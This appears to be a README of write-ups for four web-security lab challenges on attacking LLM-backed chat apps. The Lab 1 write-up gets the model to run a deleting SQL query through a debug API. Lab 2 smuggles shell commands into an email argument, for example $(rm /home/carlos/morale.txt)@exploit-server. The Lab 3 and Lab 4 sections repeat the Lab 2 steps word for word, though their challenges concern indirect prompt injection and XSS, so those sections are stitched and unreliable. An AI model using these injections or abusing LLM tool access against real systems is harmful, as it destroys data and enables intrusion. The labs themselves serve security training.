# LLM-Security-Labs

## Lab 1: Exploiting LLM APIs with excessive agency

### Challenge
To solve the lab, use the LLM to delete the user `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments `Debug_SQL_API` and `SQLcommand string`.
- Now, I call the `Debug_SQL_API` with the the SQL Comand `SELECT * FROM USERS` which returns the respective information regarding the user like name, password, etc.
- Sweet, I query the same API but with a different args `DELETE FROM users WHERE username='carlos'` which forces the LLM to access the API, run my SQL query and delete the respective user.

**CHALLENGE SOLVED**
![LLMSec1](https://github.com/user-attachments/assets/38cca6c6-2787-4693-80be-ca9b472338df)

## Lab 2: Exploiting vulnerabilities in LLM APIs

### Challenge
This lab contains an OS command injection vulnerability that can be exploited via its APIs. You can call these APIs via the LLM. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs which can lead to command injection vulnerabilities.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**
![LLMSec2](https://github.com/user-attachments/assets/e55a6f59-385a-460f-9164-aa87b86a095f)

## Lab 3: Indirect prompt injection

### Challenge
This lab is vulnerable to indirect prompt injection. The user `carlos` frequently uses the live chat to ask about the Lightweight "l33t" Leather Jacket product. To solve the lab, delete `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs also succeptible to prompt injection.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**

![LLMSec3](https://github.com/user-attachments/assets/cc359355-d86d-45a0-a2c5-7ef628679f5d)
![LLMSec4](https://github.com/user-attachments/assets/2905e17c-acec-44f6-a66c-1f643e969116)

## Lab 4: Exploiting insecure output handling in LLMs

### Challenge
This lab handles LLM output insecurely, leaving it vulnerable to XSS. The user carlos frequently uses the live chat to ask about the **Lightweight "l33t" Leather Jacket** product. To solve the lab, use indirect prompt injection to perform an XSS attack that deletes `carlos`.

### My Approach
- To visit the `LiveChat` Web page.
- According to the challenge description and LLM's nature, they are exposed to some APIs which can lead to command injection vulnerabilities.
- I use prompt engineering to gather details regarding the same and ask about APIs and their respective arguments like `product_info`, `password_reset`, `subscribe_to_newsletter (args - emailaddress)`.
- I did call the `subscribe_to_newsletter` with arg `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to recieve an email on **EMAIL CLIENT** web page.
- We can use the email address for RCE `$(command to execute)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
- Now, time to test and play with the LLM and gather infromation `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` hich returned `carlos` as the output for the command.
- Similarly, for `$(pwd)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` and `$(ls)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` which returns `/home/carlos` and `morale.txt`, respectively.
- Now is the time to delete the file and solve the challenge by `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
  
**CHALLENGE SOLVED**
